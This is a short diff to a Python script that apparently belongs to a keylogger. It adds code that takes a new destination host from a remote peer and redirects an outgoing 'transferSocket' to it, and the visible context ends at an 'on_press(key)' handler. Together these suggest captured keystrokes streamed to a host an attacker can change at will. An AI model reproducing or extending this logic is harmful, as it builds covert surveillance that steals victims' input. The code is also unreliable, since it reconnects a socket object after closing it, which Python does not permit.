@@ -15,12 +15,15 @@ transferSocket = socket.socket()
 transferSocket.connect((transferHost, transferPort))
 
 def receive():
+    global transferHost
     c, addr = receiveSocket.accept()
     while True:
         new_transferHost = c.recv(20).decode()
         if not (new_transferHost == transferHost):
             print("change")
+            transferSocket.close()
             transferHost = new_transferHost
+            transferSocket.connect((transferHost, transferPort))
         print(new_transferHost)
 
 def on_press(key):
